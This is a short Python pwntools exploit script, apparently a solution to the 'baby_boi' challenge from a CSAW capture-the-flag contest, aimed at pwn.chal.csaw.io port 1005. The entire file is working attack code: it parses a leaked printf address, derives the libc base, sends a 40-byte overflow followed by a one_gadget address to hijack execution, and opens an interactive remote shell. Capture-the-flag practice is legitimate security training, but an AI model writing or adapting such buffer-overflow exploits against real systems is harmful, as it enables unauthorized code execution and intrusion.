#!/usr/bin/python
from pwn import *

# Connection Info
host = 'pwn.chal.csaw.io'
port = 1005

# Addresses/offsets
printf_off = 0x0000000000064e80

# Gadgets
pop_rdi    = 0x0000000000400643
one_gadget = 0x4f2c5

# Exploit Function
def exploit(conn):
    conn.recvuntil( ': ' )
    printf_addr = int(conn.recv(14), 16)
    print( '[*] Printf Address: ' + hex(printf_addr) )
    libc_base = printf_addr - printf_off
    print( '[*] Libc base address: ' + hex(libc_base) )
    payload = "A"*40
    payload += p64( libc_base + one_gadget )
    conn.sendline(payload)
    conn.interactive()

if __name__=="__main__":
    conn = remote(host, port)
    #conn = process('baby_boi')
    exploit(conn)
